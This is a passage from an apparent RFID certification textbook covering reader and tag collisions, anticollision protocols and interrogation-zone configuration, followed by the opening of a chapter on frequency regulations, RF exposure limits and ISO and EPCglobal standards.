connections with network connections.
Network Connections
A network connection is made through a network card, also called an Ethernet card or interface. 
The reader and the host computer are connected to the network through network interfaces 
such as Ethernet cards and use the TCP/IP protocols to transfer data. For this reason this 
connection is also called a TCP/IP connection.
NOTE
Transmission Control Protocol/Internet Protocol (TCP/IP) is a suite of protocols 
used by all computers connected to the Internet to communicate with each 
other. You can think of the Internet as a big network of computers and other 
devices connected to it.
Some of the protocols included in the TCP/IP protocol suite are described in 
Table 4.1.

 
Working with Interrogation Zones • Chapter 4 
85
An interrogator connected to the network using TCP/IP must have a network address 
called an IP address. Network connectivity offers the following advantages to your RFID system:
■ 
There’s no need for a cable between an interrogator and a host computer.
■ 
The interrogators can be connected to the network through network cables or 
wirelessly.
■ 
The system requires a smaller number of host computers.
■ 
You can manage the RFID system remotely.
For a good-sized RFID system, the advantages of a networked system outweigh its 
disadvantages. However, you should be aware of the possible disadvantages of a networked 
RFID system:
■ 
Your system becomes vulnerable to all the security risks that a network poses. 
Of course, security solutions are available.
■ 
A network shutdown will bring the whole system down.
■ 
You need network administrative skills to run a network.
A network of interrogators is an RFID system with multiple interrogators. Each interro-
gator in your RFID system offers an interrogation zone, and it will attempt to read all

Chapter 4 • Working with Interrogation Zones
the tags passing through (or sitting in) the interrogation zone. For an RFID system with 
multiple interrogators, there will be multiple interrogator zones, with each interrogator reading 
multiple tags. This situation can offer what is called a dense environment.
Dealing With Dense Environments
Interrogators and tags are two main components of an RFID system. When an RFID system 
contains multiple tags and interrogators, a condition called a dense environment can arise. 
There are two kinds of dense environments:
■ 
Dense interrogator environment A dense interrogator environment is an area in 
which multiple interrogators are operating in close proximity to one another.
■ 
Dense tag environment A dense tag environment is an area in which multiple 
tags are in the interrogation zone of an interrogator so that more than one tag can 
get the same signal from the interrogator.
Dense environments can hamper RFID system performance through effects such as 
collisions.
Understanding Collisions
What can you expect in a dense (crowded) environment? Yes, you are right: collisions. 
Corresponding to the two kinds of dense environments are two kinds of collision: reader 
collisions and tag collisions.
Reader Collisions
Reader collisions occur in a dense interrogator environment. In this environment, the 
interrogation zone (coverage area) of one interrogator overlaps with the interrogation zone 
of another interrogator. This overlap causes the following two problems:
■ 
Multiple reads More than one reader whose interrogation zones overlap can 
read the same tag. Depending on the application, these duplicate reads can cause 
problems. As an analogy, think of counting something multiple times when it’s 
supposed to be counted only once. One of the solutions to this problem is to 
program the RFID system so that a tag with a given unique ID is read only once.
■ 
Signal interference When the interrogation zones of two readers overlap, the 
signals from the two readers traveling in the overlap area at the same time can 
collide with each other. This is called signal interference. One of the solutions to this 
problem is that the readers use the time division multiple access (TDMA) technique, 
according to which the readers read at fractionally different times, thereby reducing 
the probability of collisions.

 
Working with Interrogation Zones • Chapter 4 
87
Tag Collisions
A tag collision occurs when two or more tags try to respond to an interrogator’s request for 
information at the same time. Why would they do that? Because they all were in the 
interrogation zone, so they all received the request the interrogator sent. The multiple 
responses will confuse the interrogator and could make it unable to identify any of the 
responding tags and thereby the tagged items.
NOTE
The dense tag environment also creates a shadowing effect, which is a 
situation in which a tagged item blocks the reader signal from reaching 
another tagged item hiding behind it. Therefore, the hiding item can never 
be read and is said to be shadowed by the item in front of it.
So, the dense environments create collision problems, which can be addressed by 
so-called anticollision protocols.
Anticollision Protocols
Where there is a problem, there is (or should be) a solution. A solution to the collision 
problem is offered by the anticollision protocols, which fall into two categories: aloha-based 
protocols and tree-based protocols.
Aloha-Based Protocols
The basic goal here is to read one tag at a time. Aloha-based protocols accomplish that by using 
the following two schemes:
■ 
Time-slotted aloha In the time-slotted aloha scheme, an interrogator keeps 
periodically sending a request for an ID. Such an interrogator is called a beacon. 
When a tag receives the request, it randomly selects a time slot in which it responds 
with its ID. If the interrogator recognizes the ID, it starts communicating with that 
tag to get the required information. After the interrogator is done communicating 
with this tag, it again starts sending out the request commands that another tag can 
respond to, and so on. If two or more tags get the same request command from the 
interrogator, the hope is that the random selection algorithm will generate different 
time slots for their responses, thereby avoiding the collision. Note that it’s possible 
that the two tags can select (randomly) the same time slot. In this case there will be 
a collision. So, this approach reduces collisions but does not eliminate them.

88 
Chapter 4 • Working with Interrogation Zones
■ 
Frame-slotted aloha The frame-slotted aloha scheme is an extension of the 
time-slotted scheme. Instead of randomly selecting a time slot, a frame of multiple 
time frames is conﬁ gured, and a given tag can only respond in a speciﬁ c time slot 
within the frame. This further reduces the probability of collision.
There are two problems with the aloha-based protocols:
■ 
They cannot completely eliminate collisions.
■ 
In the aloha-based protocols, a tag might not be identiﬁ ed for a long time because 
other tags keep selecting time slots earlier than that of this tag. This situation is 
called tag starvation.
Tree-based anticollision protocols offer a solution to the tag starvation problem.
Tree-Based Protocols
Tree-based protocols use the algorithm that splits the group of colliding tags into two subgroups 
iteratively until the reader recognizes the tag IDs without collisions. This can be done in two 
different ways, which gives rise to two tree-based protocols:
■ 
Binary tree protocol To support the binary tree protocol, the tags are required to 
manage a counter and have a random number generator. The colliding tags are split 
according to a number that they randomly select. The tags that select 0 transmit their 
IDs to the interrogator. If multiple tags select 0 and hence respond, the interrogator 
keeps walking down the tree until only one tag responds. When that happens, the 
interrogator establishes communication with that tag to get the required information.
■ 
Query tree protocol The query tree protocol uses the algorithm, following which 
the interrogator sends a query with a preﬁ x and the tags that have the ID to match 
the preﬁ x respond.
Tree-based protocols solve the tag starvation problem, but they can create long identiﬁ cation 
delays. So, the underlying goal of all anticollision protocols is to select only one tag at a time 
that the reader can communicate with. However, for a tag to be read by an interrogator, it must 
be in the interrogation zone. The interrogation zones need to be set up and conﬁ gured.
Conﬁ guring Interrogation Zones
The interrogator zone is the area around an interrogator within which it can successfully 
communicate with a tag. In other words, when a tag enters an interrogation zone, it can be 
interrogated by the interrogator. From the perspective of a passive tag, the interrogator zone 

 
Working with Interrogation Zones • Chapter 4 
89
is the area in which an interrogator can provide enough energy to power up the passive tag 
and receive information. Passive tags outside the interrogation zone do not receive enough 
energy from the interrogator to reﬂ ect a signal.
CAUTION
The interrogation zone is sometimes also called the read ﬁ eld or the reader 
ﬁ eld.
Interrogation zones need to be conﬁ gured, which involves setting up readers at speciﬁ c 
locations where the large number of items pass through. These points are called choke points.
The deﬁ nition of a successful conﬁ guration of an interrogation zone will be inﬂ uenced 
and partly determined by the following two factors:
■ 
Business process ﬂ ow
■ 
Site assessment, including physical infrastructure, discussed in Chapter 7
However, the following are the common factors that you should consider to successfully 
conﬁ gure the interrogation zone:
■ 
The read rates required by the tag trafﬁ c
■ 
Power required by the interrogator and the tags
■ 
Distance required or available between the interrogator and the tags
Conﬁ guring an interrogation zone involves the following:
■ 
Conﬁ guring interrogator commands
■ 
Conﬁ guring interrogator settings
■ 
Adjusting the read power of the interrogator to an optimal value
Conﬁ guring Interrogator Commands
Interrogator commands are usually issued on the host computer, either by an 
application or using a GUI. Some of the common interrogator commands are described 
in Table 4.2.

90 
Chapter 4 • Working with Interrogation Zones
As you can see in Table 4.2, some commands such as LOCK and UNLOCK conﬁ gure 
certain behavior or capability in the interrogator.
CAUTION
One use of the KILL command is to address privacy concerns. However, remember 
the other side of the coin: It can also be used maliciously to disrupt the system.
The KILL command, once issued, prevents a tag from communicating back to the 
reader, and it appears to the reader as inoperative. Why will you use the KILL command? 
One reason is to manage the tag population. Other commands that you can use to manage 
the tag populations are:
■ 
SELECT You can use this command to determine which groups of tags will 
respond to this interrogator. For selection purposes, you can group the tags by 
characteristics such as manufacturer code. By isolating only certain groups of tags 
that the interrogator should care about, you increase system performance, because 
now that interrogator has fewer numbers of tags to deal with and to sort through. 
Once you have grouped together some tags that the interrogator should care about, 
you can identify the individual tags in the group.
■ 
INVENTORY This command is used to identify an individual tag in a group. 
After an individual tag has been identiﬁ ed, the interrogator can access it.
■ 
ACCESS This command is used to access the individual tag in a group. Once the 
interrogator has access to an individual tag, it can deal with it, such as reading the 
information from it, writing information to it, killing the tag, and so on.

The tag population is controlled to optimize the interrogation zone and improve system 
performance. In addition to these commands, there are some other settings that you can 
conﬁ gure.
Conﬁ guring Interrogator Settings
Different interrogators offer different settings and features that you can conﬁ gure. Some of 
these settings are described in Table 4.3.
Table 4.3 Some Settings That You Can Conﬁ gure for Readers
Setting 
Description
Event notiﬁ cation 
When enabled, this setting provides notiﬁ cation when
 
a certain event occurs, such as a tag entering the
 
interrogation zone or the number of tags in the inter-
 
rogation zone exceeding a threshold value.
Filtering 
Sets speciﬁ c ﬁ lters and associates them with speciﬁ c
 
read points. This allows you to tell the interrogator
 
to be interested only in certain kinds of tags and to
 
ignore other kinds.
Host management 
Authorizes the listed host computers, called trusted
 
hosts, to communicate with the interrogator.
Reader communication 
Allows you to set communication-related settings.
Reader operation 
Allows you to rename, enable, or disable the
 
interrogator.
Read point zone 
Allows you to logically group two or more read points
 
for management purposes.
User management 
Allows you to add users who can then be given access
 
and management rights.
Some available software applications will help you conﬁ gure, monitor, and manage the 
readers in your RFID system. Following are some additional features offered by such applications:
■ 
Reader status You can get the status of a speciﬁ c interrogator by issuing the 
speciﬁ c reader status command offered by the application that will typically display 
the following information:
■ Information about the interrogator’s kernel
■ Information about the read points and antennas attached to the interrogator
■ How long the reader has been up and running

92 
Chapter 4 • Working with Interrogation Zones
■ 
Overall status You can also get details on the overall status of the RFID system, 
such as the following:
■ Total number of readers connected to the system
■ Readers enabled for reading
■ 
Scan control You can use this feature to scan the read points and enable and 
disable them.
The other interrogator zone-related conﬁ guration tasks that you are allowed to perform 
are the following:
■ 
Select RFID protocols to be used by the interrogator, such as anti-collision 
protocols
■ 
Modify the conﬁ guration options for the protocol that you selected
■ 
Set the RF mode
■ 
Adjust output power
■ 
Enable tag alerts
You can also conﬁ gure interrogator commands and settings to optimize the interrogation 
zone.
Optimizing Interrogation Zones
You want your RFID system to be reliable, robust, and performing at its peak. The reliability, 
robustness, and performance are built into the system components, but you can optimize them 
by ﬁ ne-tuning the way the components work together. One way you can make your system 
more reliable and robust and yield peak performance is by optimizing the interrogation zones. 
Optimizing an interrogation zone involves correctly setting up the system for the given 
environment and application in which the interrogator will function. Some of the factors that 
you need to consider for optimizing the interrogation zones are discussed in this section.
The Network Factor
A network has a limited bandwidth for communication—that is, for transferring data. All the 
devices on the network share that bandwidth. An RFID reader can typically read hundreds 
of tags per second; each read cycle for each reader consumes bandwidth. Uncontrolled 
readers can slow the network by consuming large shares of bandwidth. Therefore, network 
trafﬁ c must be monitored and managed. In addition, to optimize the system you are setting 
up, you should carefully consider the bandwidth and the number of readers that will share 
that bandwidth on your network.

 
Working with Interrogation Zones • Chapter 4 
93
NOTE
Bandwidth is the width of a band of electromagnetic frequencies used for 
transferring data. It is a measure of how fast data can be transferred on a 
given transmission path and determines the total data transmission rate that 
the path can offer. The basic units of bandwidth are Hertz, abbreviated Hz 
(cycles/sec), in the analogous world and bits/sec in the digital world.
Operation Mode
Your interrogator’s performance can depend on the mode in which the interrogator is 
communicating. An interrogator can communicate in one of the following two 
communication (or operational) modes:
■ 
Half duplex This is the mode in which data transfer between two devices can 
occur in only one direction at a time. That means that a reader operating in half-
duplex mode can either send signals to tags or receive signals from a tag but cannot 
send and receive at the same time. An interrogator operating in half-duplex mode is 
conﬁ gured for a monostatic antenna, which means that the interrogator uses the same 
(one) antenna for sending and receiving signals. A monostatic antenna is also called 
a patch antenna. A monostatic antenna conﬁ guration offers a smaller coverage area.
■ 
Full duplex This is the mode in which data can be transferred between two 
devices in both directions simultaneously. That means that a reader operating in 
full-duplex mode can send a signal to the tag and receive a signal from a tag at the 
same time. An antenna conﬁ guration for the reader that offers this functionality 
is called a bistatic antenna, which means that the interrogator will use one antenna 
for sending signals and another antenna for receiving signals. A bistatic antenna 
conﬁ guration offers a wider coverage area.
Reader-to-Reader Interference
As explained earlier in this chapter, if multiple readers are too close to each other, their 
interrogation zones can overlap. This will cause collisions and interference between the 
signals from different readers. The anticollision protocols as solutions to collisions have 
already been discussed in this chapter. You can also consider the following solutions to 
avoid interference problems:
■ 
Position the interfering antennas away from each other.
■ 
Reduce the interrogator power.

94 
Chapter 4 • Working with Interrogation Zones
■ 
Set the interfering interrogators to operate on different frequencies.
■ 
Program the RFID system so that a tag with a given unique ID is read only once. 
This will solve the multiple reads problem.
■ 
Set the readers to use the TDMA technique, according to which the readers read at 
fractionally different times, thereby reducing the probability of collisions.
You can also properly tune your reader to improve system performance.
System Performance and Tuning
You can tune and conﬁ gure certain characteristics of a reader, such as power output and 
protocols, to optimize its performance in a given environment and application:
■ 
Power output You can ﬁ ne-tune an interrogator by adjusting its output power. 
Remember that always using the maximum allowed power output may not be the 
best choice for your system. So you might need to optimize the power settings for 
a given environment and application. You should evaluate the physical quantities 
such as attenuation, ERP, and free space loss to adjust the power settings for an 
interrogation zone.
■ 
Protocol conﬁ guration Different tags may support different communication 
protocols. To read all kinds of tags, a reader typically has to support and execute 
several protocols because the reader does not know ahead of time what protocol 
the incoming tags might be supporting. This takes time and slows down the reader. 
However, when all the tags are coming from the same location and support a 
speciﬁ c protocol, you can conﬁ gure the reader for that speciﬁ c protocol only. This 
will improve the reader’s performance. However, keep in mind that you cannot do 
this for a location where the tagged items come from different places and the tags 
might be supporting different protocols.
■ 
Read cycle rate A read cycle is a scan for RFID tags performed by a reader. The 
reader can run read cycles periodically or on demand. After a read cycle, the reader 
returns (for example, to the host computer) a set of observations—for example, a set 
of IDs for the tags that were read. For peak performance, the read cycle rates must 
be optimized. For instance, if you know that only a certain kind of tag will enter a 
given interrogation zone, you conﬁ gure the interrogator to scan (look) for only that 
kind of tag. This will reduce the overall scan time and thereby improve performance.
The Tag Travel Speed
The term tag travel speed refers to the speed of the tagged item or the speed of the platform such 
as a conveyor on which the tagged items are placed. The travel speed determines the following:

 
Working with Interrogation Zones • Chapter 4 
95
■ 
The duration for which a tag will stay in the interrogation zone
■ 
The number of tags that will pass through the interrogation zone in a given 
duration and will need to be read in that duration
The higher the tag travel speed, the higher the reader read speed that is required for an 
optimal interrogation zone. So, to determine the optimal read speed for the reader, you need 
to know how many tags will pass through the interrogation zone per unit of time. If you 
decrease the tag speed too much, the tag read rate will decrease as well, and if you increase 
the tag speed too much, the reader will miss reading some of the tags, which will hamper 
accuracy. Therefore, to optimize the interrogation zone, you need to strike a balance between 
tag speed and the reader’s read speed.
The three most important takeaways from this chapter are the following:
■ 
The job of an interrogator is to collect information from the tags in its interrogation 
zone and send that information to a host computer, where it can be used.
■ 
Multiple tags in an interrogation zone create a dense tag environment, which causes 
tag collision—that is, multiple tags try to respond to an interrogator at the same 
time. Overlapping interrogation zones create a dense interrogator environment, 
which causes reader collision—that is, multiple readers try to read the same tag 
and their signals interfere.
■ 
You should conﬁ gure a reader to optimize its interrogation zone. The strategy for 
optimization may depend on the environment and the application.

96 
Chapter 4 • Working with Interrogation Zones
Summary
The core functionality of an interrogator (also called a reader) is to collect information 
from tags and send that information to a host system. For a tag to be read successfully, it 
must be in the area around the interrogator, called the interrogation zone. Multiple tags in 
an interrogation zone can create an environment called a dense tag environment, which can 
cause tag collisions—that is, multiple tags try to respond to an interrogator at the same 
time. Multiple interrogators close to each other may create overlapping interrogation zones, 
called a dense interrogator environment. The dense interrogator environment causes reader 
collisions, which means multiple readers try to read the same tag and the signals from 
multiple readers interfere with each other. The collision problem is addressed by anticollision 
protocols, which fall into two categories: aloha-based protocols and tree-based protocols. 
Aloha-based protocols create the tag starvation problem—that is, a tag may have to wait 
for very log time before it could be identiﬁ ed; whereas tree-based protocols solve the 
starvation problem, but they can create long identiﬁ cation delays in general.
Interrogation zones need to be conﬁ gured, a process that includes setting up readers and 
conﬁ guring reader commands and options. While conﬁ guring an interrogation zone, you 
must try to optimize it for performance and application requirements. The deﬁ nition of 
successful conﬁ guration and optimization partly depends on the environment in which the 
RFID system works and the application. In this chapter, we talked about collision protocols. 
Protocols and standards are important for the smooth advancement of any industry. We 
discuss RFID standards in the next chapter.

Interrogation zone The area around an interrogator within which it can 
successfully communicate with a tag. In other words, if a tag enters the 
interrogation zone, it can be interrogated by the interrogator.
Interrogator The RFID component that collects information from tags and 
sends it to a host system. The process of collecting the information from the tags is 
called reading the tags, and for this reason an interrogator is also called a reader.
IP Internet Protocol; used to deﬁ ne IP addresses for devices and to send data to 
communicate with a destination device.
Monostatic antenna conﬁ guration The conﬁ guration in which an interrogator 
uses the same (one) antenna for sending and receiving signals. This conﬁ guration 
enables only the half-duplex mode of communication.
Operating frequency The frequency of the radio waves that the interrogator 
and the tag use to communicate with each other.
Read cycle A scan for RFID tags performed by a reader. The reader can run 
read cycles periodically or on demand.
Reader The RFID component that collects information from tags and sends it 
to a host system. The process of collecting the information from the tags is called 
reading the tags or interrogating the tags. For this reason, a reader is also called an 
interrogator.
Read rate The number of tags that a reader can read per unit of time. Sometimes, 
read rate is also used for maximum data transfer rate—that is, the maximum rate at 
which data can be read from a tag, expressed in units of bits/sec.
Network connection A connection made between two devices by connecting 
them to the same network through their network interfaces (cards). For a network 
connection, a device must have an IP address.
Reader collision An interference in communication that occurs because two 
or more interrogation zones are overlapping. This situation is a result of a dense 
interrogator environment.
Serial communication The process of transferring data from one device to 
another sequentially, one bit at a time.
Serial connection A connection set up between two devices by connecting 
their serial ports through a cable.
Tag collision An interference in communication that occurs because two or 
more tags try to respond to an interrogator at the same time. This situation is a 
result of a dense tag environment.

Chapter 5 • Working with Regulations and Standards
Introduction
All mature (or maturing) industries have their regulations and  standards, and the RFID 
industry is no exception. Regulations help make the devices and systems in the industry 
secure and safe, and they help the industry advance without disrupting other industries. 
Standards are necessary to bring some order and interoperability within a speciﬁ c industry. 
Without agreed-on standards, all vendors will manufacture or develop products and devices 
by following their own rules, and there will be a perfect chaos instead of interoperability. 
Of course, regulations and standards have their impact on an industry’s products as well.
So, the main goal of this chapter is to understand the regulations and standards at 
work in the RFID industry. To accomplish this goal, we will explore three avenues: 
RFID regulations, RFID standards, and the impact of these regulations and standards.
Understanding Regulations and Standards
What are regulations and standards, and why do we need them? First, note that regulations 
and standards are not limited to RFID systems. Let’s take a general look at these two concepts: 
regulations and standards.
Regulations
A regulation, in general, is a legal restriction promulgated by a government administrative 
agency through rule making and is typically supported by a threat of consequences, such as ﬁ ne 
for not following the rules. A regulation is mandated by the government or state as an attempt 
to produce an outcome that might not otherwise occur or to prevent an outcome that might 
otherwise occur. Regulations rarely work perfectly; they don’t always produce the complete 
desired outcome or completely prevent the undesired  outcome, but they do generally modify 
what would otherwise take place. Examples of regulations include controlling market entries, 
prices, wages, pollution, employment for certain groups of people in certain industries, and 
standards of production for certain goods and services—as well as, of course, the regulations 
involved in manufacturing RFID devices.
Standards
The term standard refers to the way something should be done. When multiple vendors are 
producing the same product in different ways, the products from those different vendors will 
not interoperate. If all those vendors followed the same standard, their products would be 
compatible with each other and would be interoperable. So, in some industries the absence 
of a standard would mean chaos.
In the context of industries and technologies, standardization is the process of establishing 
a technical standard among competing vendors in a market to bring beneﬁ ts without hurting 

 
Working with Regulations and Standards • Chapter 5 
103
competition. As an example, all of Europe uses 230-volt, 50 Hz, AC main grids and Global 
System for Mobile Communications (GSM) cell phones, and they measure length in meters. 
An example of global standards is the Internet, which is based on standard protocols. Other 
examples of global standards are the worldwide standards and drafts for the standardization of 
power cords developed and maintained by the International Organization for Standardization 
(ISO), the International Electrotechnical Commission (IEC), and the International 
Telecommunications Union (ITU).
And then there are standards for RFID devices. One parameter that is regulated in the 
RFID industry is the frequency at which RFID devices can operate.
Regulating Frequency Usage
A tag and a reader use radio waves of a certain frequency, called their operating frequency, to 
communicate with each other. Radio waves are electromagnetic waves that cover part of 
the electromagnetic spectrum of frequencies, called radio frequency spectrum. Because RFID 
systems generate and radiate the electromagnetic waves that fall along the radio frequency 
spectrum, they are justiﬁ ably classiﬁ ed as radio systems, and they are regulated as such. 
However, other radio services were in operation before the arrival of RFID systems. 
Radio, television, mobile radio services (police, security services, and industry), marine 
and aeronautical radio services, and mobile telephones are a few to count. Therefore, it is 
important to ensure that these already existing services are not disrupted or impaired by 
these newcomers: the RFID systems.
For this reason, regulatory bodies allocate different frequency bands (ranges) to a speciﬁ c 
group of devices. RFID systems are available in all the radio frequency ranges: LF, HF, UHF, 
and microwave. Here is the situation with allocating the speciﬁ c frequencies to the RFID 
systems in these RF bands:
■ 
LF Most countries have allocated 125 KHz or 134 KHz to RFID devices.
■ 
HF Most countries have allocated 13.56 MHz to RFID devices.
■ 
UHF Different countries have allocated different frequencies.
■ 
Microwave Different countries use different frequencies.
As you can see, the frequencies being used by various countries in the LF and HF 
ranges are very consistent with each other. However, because RFID systems with operating 
f requencies in the UHF range are relatively new, no global agreement on the operating 
 frequencies for these devices has been reached yet. UHF RFID systems have evolved at 
 different frequencies in different regions of the world. The absence of a single global 
 organization to develop regulations and standards for RFID technology has prompted 
 countries to adopt their own regulations and standards.

104 
Chapter 5 • Working with Regulations and Standards
The Regulatory Regions
If the regions of the world use different operating frequencies for RFID systems, an RFID device 
that works in one region will not work in another region. Because the UHF RFID systems are 
gaining popularity all over the world, it’s desirable to have some uniformity in the operating 
frequencies for these devices. In an attempt to seek some degree of uniformity for UHF 
frequency usage, the ITU has organized the world into the following three  regulatory regions:
■ 
Region 1 includes Europe and Africa.
■ 
Region 2 includes North and South America.
■ 
Region 3 includes Asia and Australia.
Table 5.1 presents some information such as allocated UHF bands and allowed 
 maximum power emissions, as regulated by the main regulatory bodies in these regions.

TIP
It might sound silly, but it’s important, at least from the exam viewpoint, to 
remember which country belongs to which region. For example, the United 
States belongs to region 2, not region 1.

 
Working with Regulations and Standards • Chapter 5 
105
Each country in these regions manages its frequency allocations within the guidelines set 
by the region’s main regulatory body. Table 5.2 shows the RF ranges used for the RFID 
devices in various countries. This table reﬂ ects the following facts:
■ 
The HF RFID devices use 13.56 MHz operating frequency all over the world.
■ 
Most countries have allotted 125 MHz or 134 MHz for HF RFID devices.
■ 
There is better global agreement on operating frequency for the RFID devices in 
the LF, HF, and microwave ranges than in the UHF range.

The last column in Table 5.2 shows the regulated maximum power that can be emitted 
by an RFID device. The power factor is especially important for passive tags because they 
don’t have their own power source and use the power from the reader’s signal to run their 
circuitry and to compose the response signal. Consider an isotropic antenna radiating power 
uniformly in all directions. That means the power will travel in the form of a sphere. The 
area of the sphere is directly proportional to the square of the radius of the sphere, which 
implies that the energy per unit area will be inversely proportional to the square of the 
distance from the antenna. In other words, RF energy radiated by an antenna dissipates 
very quickly as the RF wave travels through space. For example, every time the distance 
from an antenna doubles, the power available reduces by a quarter. You can turn it around 
to say that the read range of a reader is directly proportional to the square root of the 
power emitted.
Safety Regulations
The human body exposed to RF radiation absorbs the energy (power) from the RF waves. 
Safety regulations and guidelines for human exposure to RF ﬁ elds are necessary because if 

106 
Chapter 5 • Working with Regulations and Standards
the RF energy absorption exceeds a threshold value, adverse biological effects could occur. 
Some of these adverse effects are:
■ 
Changes in cell cycle and cell proliferation
■ 
Changes in the blood-brain barrier that protects the brain from external harmful 
chemicals and toxins
■ 
Alterations in electric brainwaves
The absorption of RF energy is measured in a quantity called speciﬁ c absorption rate (SAR), 
which is a measure of the rate of energy absorbed by (or dissipated in) an incremental mass 
contained in a volume element of dielectric materials such as biological tissues. The SAR is 
calculated using the following equation:
SAR = C  E2/d
where:
■ 
C is conductivity of the body tissue in S/m (Siemens per meter, where Siemen is 
just a reciprocal of Ohm, the unit for resistance).
■ 
E is the electric ﬁ eld strength in the tissue in V/m.
■ 
d is the density of the body tissue in Kg/m3.
In the United States, the FCC has adopted limits for safe exposure to RF energy produced 
by mobile devices and requires that devices such as cell phones sold in the United States have a 
SAR level at or below 1.6 W per kilogram, taken over a volume of 1 gram of tissues. In Europe, 
the corresponding limit is 2 W/kg taken over a volume of 10 grams of tissues. The Institute of 
Electrical and Electronics Engineers (IEEE) has its own guidelines, as shown in Table 5.3.

0.2 W/Kg (for the entire body)
FCC (U.S.) 
1.6 W/Kg (taken over a volume of 1 gram of tissue)

CAUTION
When designing and implementing an RFID system, you must check out and 
follow the safety guidelines set by local, regional, national, and international 
organizations for human exposure to RF waves.

 
Working with Regulations and Standards • Chapter 5 
107
So, the regulations in the RFID industry ensure that RFID devices are safe and that 
they do not disrupt the already existing services. But how about the interoperability of the 
devices from different vendors—that is, the ability of the devices to function together 
 effectively? Well, that’s the job of standards.
RFID Standards
Standardization of its products is one of the important issues that any emerging industry 
has to deal with. Following are the advantages of having industry standards:
■ 
Because all vendors follow the same standard to manufacture devices, technical 
standards ensure the interoperability of the devices. This beneﬁ ts the consumer 
and helps vendors develop healthy competition.
■ 
Because the standards bodies are not serving the interests of just one vendor, 
standards generally deﬁ ne the most efﬁ cient platform on which an industry 
can operate and advance.
■  Standards generally reduce cost and ease implementation.
■ 
Standards develop consumer conﬁ dence in the technology.
Several organizations have been involved in developing standards for RFID technology; 
the ISO and EPCglobal are the prominent two.
ISO Standards
The ISO is an international standards body composed of representatives from national 
standards bodies. Founded on February 23, 1947, this organization sets worldwide industrial 
and commercial standards, which are popularly called ISO standards.
The ISO has developed RFID standards in the following areas:
■ 
Identiﬁ cation standards regarding the coding of ID or other information on tags.
■ 
Air interface protocols that deﬁ ne the rules of communication between tags and 
interrogators.
■ 
Data protocols for the middleware of an RFID system.
■ 
Standards for testing, compliance, and safety.
Some of these standards are shown in Table 5.4.
NOTE
The International Electrotechnical Commission (IEC) is an international  standards 
organization in the area of electrical, electronic, and related  technologies. 
Some of its standards are developed jointly with the ISO.

The various values of the integer i in the table correspond to different operating

readers and tags. This includes the rules about the following tasks:
■ 
Data encoding, including modulation and demodulation
■ 
Communication commands to make operations on the tag, such as reading, writing, 
modifying, and locking data, as well’s killing the tag
■ 
Anticollision algorithms
The ISO develops standards in several areas, including computer networking. In the 
world of RFID standards, there is another player speciﬁ c to RFID: EPCglobal.
EPCglobal Standards
Here is how EPCglobal came into the picture: The Auto-ID Center at Massachusetts 
Institute of Technology (MIT), working in conjunction with industry leaders and 
academic institutions around the world, designed a system to bring the beneﬁ ts of RFID 
to the global supply chain. This system comprises the Electronic Product Code (EPC), 
RFID technology, and the supporting software based on EPCglobal standards, and is 

 
Working with Regulations and Standards • Chapter 5 
109
referred to as the EPCglobal Network. The network includes elements such as EPC, 
the ID system for EPC tags and readers, and Object Name Service (ONS). The 
EPCglobal network (or any RFID  information network like this) provides the following 
ﬁ ve main services:
■ 
Assigning unique identiﬁ cation numbers to items to enable them to be 
identiﬁ ed EPC numbers allow item-level tracking.
■ 
Detecting and identifying items EPC tags and readers make it possible.
■ 
Collecting and ﬁ ltering data EPC middleware provides services that facilitate 
data exchange between EPC readers and business information systems such as 
databases. Only the data about events of interest will be stored.
■ 
Querying and storing data This service enables different enterprise applications 
running at different locations to exchange and share data. That means the trading 
partners can query and exchange data among themselves.
■ 
Locating information This is a lookup and discovery service to locate the 
repositories for the required EPC data.
EPCglobal Inc. is a joint venture between GS1 (formerly known as EAN International) 
and GS1 US (formerly the Uniform Code Council Inc.). The organization was set up to 
achieve worldwide adoption and standardization of EPC technology in an ethical and 
responsible way. In other words, EPCglobal is leading the development of industry-driven 
standards for EPC to support the use of RFID in today’s trading network environments. 
The EPCglobal Gen 2 (popularly called Gen 2) standard, approved in December 2004, 
is likely to form the backbone of RFID tag standards moving forward.
NOTE
The Gen 2 standard is designed to work globally and enjoys the support of 
major manufacturers.
What is EPC, anyway? EPC is a family of coding schemes for Gen 2 tags. It is designed 
to meet the needs of various industries while at the same time guaranteeing uniqueness 
for all EPC-compliant tags, called EPC tags. EPC encoding schemes typically contain 
a serial number, called an EPC number, which can be used to uniquely identify an object. 
The EPC number is a structured number composed of multiple ﬁ elds, as shown in 
Table 5.5.

protocols and therefore will use EPC Manager numbers. Hence the EPC Manager numbers 
issued by EPCglobal are required if companies will engage with trading partners outside 
their internal operations.
An example of an EPC number is shown in Figure 5.1. Additional ﬁ elds may also be 
used as part of the EPC number to properly encode and decode information from different 
numbering systems into their native (human-readable) forms.

The EPC system also deﬁ nes the tag classes, which are discussed in Chapter 4.
Of course, these regulations and standards have their impact on the RFID industry, 
including users. Most of the standards we have looked at so far can be categorized into 
two groups: tag data standards and air interface protocols.

 
Working with Regulations and Standards • Chapter 5 
111
Air Interface and Tag Data Standards
An RFID system consists of two main functionalities:
■ 
Tag data Writing data to a tag and reading data from the tag.
■ 
Communication Transferring data—for example, between a reader and a tag.
Corresponding to these two functionalities are two groups of standards: standards for tag 
data formats and standards for air interface protocols.
Tag Data Standards
Tag data standards are protocols that specify how to write data to a tag and how to read data 
from the tag. In other words, they specify the encoding, decoding, and formats of data. The 
whole does not need to be stored on a tag. You can store data about an item in a database 
and let the data ﬁ elds on the tag point to this data. For example, after you retrieve the EPC 
number from a tag, this number can point to the data about the item stored in a database. 
Tag data formats can be used to accomplish the following:
■ 
Specify the tag architecture.
■ 
Identify a speciﬁ c item—for example, during shipment.
■ 
Specify the available memory size on a tag.
CAUTION
You must know the difference between air interface protocols and tag data 
standards.
Air Interface Protocols
Air interface protocols specify the rules for communication between a tag and a reader. 
This set of protocols include anticollision algorithms to deal with the dense environments as 
well as modulation and demodulation—that is, coding data into the outgoing carrier signal 
and decoding data from an incoming signal. Some features of an air  interface protocol 
may depend on the operating frequency. For example, multiple standards with the name 
ISO/IEC 18000-i, where i is an integer, correspond to different frequencies.

112 
Chapter 5 • Working with Regulations and Standards
Impact of Regulations and Standards
RFID regulations and standards have deﬁ nitely made an impact on the RFID industry in 
various areas, including business operations and IT infrastructure. The impact has both 
advantages and disadvantages.
Advantages of Regulations
The regulations in the RFID area made by different countries and regulatory organizations 
have the following positive impacts:
■ 
They lower the risk of adverse radiation effects.
■ 
They pave the way for healthy market competition by regulating the areas where foul 
play could otherwise happen. For example, regulating the frequency and the maximum 
power emission secures the existing RF technologies and services from disruption 
and secures the public from adverse radiation effects. At the same time, it also forces 
vendors to compete in other areas such as features, price, and customer service.
